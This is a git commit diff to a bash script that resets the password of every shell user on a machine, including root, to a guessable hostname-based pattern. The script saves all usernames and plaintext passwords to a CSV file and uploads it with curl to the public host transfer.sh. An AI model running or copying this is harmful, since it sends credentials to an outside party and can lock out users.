6aeff5117d1fc6da4478d710233bd06da3da8fe2
root <root@compile-serv.us-central1-a.c.nomadic-archway-229204.internal>
2023-02-18 14:49:58 +0000

    up

--- changepasswordbatch.sh
+++ changepasswordbatch.sh
@@ -1,18 +1,32 @@
 #!/bin/bash
 
 # Define the password to be set for all users
-
-card=$(lshw -class network | grep "logical name:" | sed 's/logical name://' | tail -n 1)
-ip4=$(/sbin/ip -o -4 addr list $card | awk '{print $4}' | cut -d/ -f1)
-lastoctet=$(echo $ip4 | rev | cut -d'.' -f1 | rev)
-# Get a list of all users
-new_password="$(hostname)isaslut$lastoctet"
-
 users=$(grep 'sh$' /etc/passwd | cut -d':' -f1)
 
 # Loop through all users
+printf "\n\n"
+printf "===========================================================================\n"
+printf "========================       PASSWORD CHANGE      =======================\n"
+printf "===========================================================================\n"
+printf "\n\n"
+
+echo "username,password" > users.csv
+
 for user in $users; do
+  var=$(echo -n "$[ $RANDOM % 400 + 10 ]")
+  new_password="$(hostname)isacoolguy!${var}"
   # Change the password for each user
   echo "$user:$new_password" | chpasswd
-  echo "Password for $user changed to $new_password"
+  echo "$user,$new_password"
+  echo "$user,$new_password" >> users.csv
 done
+
+printf "\n\n"
+printf "TRANSFER SH LINK FOR CSV FILE\n\n"
+curl --upload-file users.csv https://transfer.sh
+
+#REMOVE IF UNABLE TO UPLOAD TO TRANSFER.SH
+rm -f users.csv
+
+
+printf "\n\n"
